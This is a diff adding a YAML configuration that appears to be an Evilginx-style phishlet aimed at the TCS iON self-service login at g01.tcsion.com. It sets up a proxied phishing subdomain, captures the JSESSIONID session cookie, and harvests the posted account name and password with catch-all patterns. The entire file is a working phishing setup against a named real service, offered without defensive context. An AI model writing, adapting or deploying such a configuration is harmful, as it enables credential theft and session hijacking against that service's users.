@@ -1,0 +1,24 @@
+author: '@shlok-lucideus'
+min_ver: '2.3.0'
+proxy_hosts:
+  - {phish_sub: 'g01', orig_sub: 'g01', domain: 'tcsion.com'}
+
+sub_filters: []
+
+auth_tokens:
+  - domain: 'g01.tcsion.com'
+    keys: ['JSESSIONID']
+
+credentials:
+  username:
+    key: 'accountname'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'password'
+    search: '(.*)'
+    type: 'post'
+
+login:
+  domain: 'g01.tcsion.com'
+  path: '/SelfServices/'
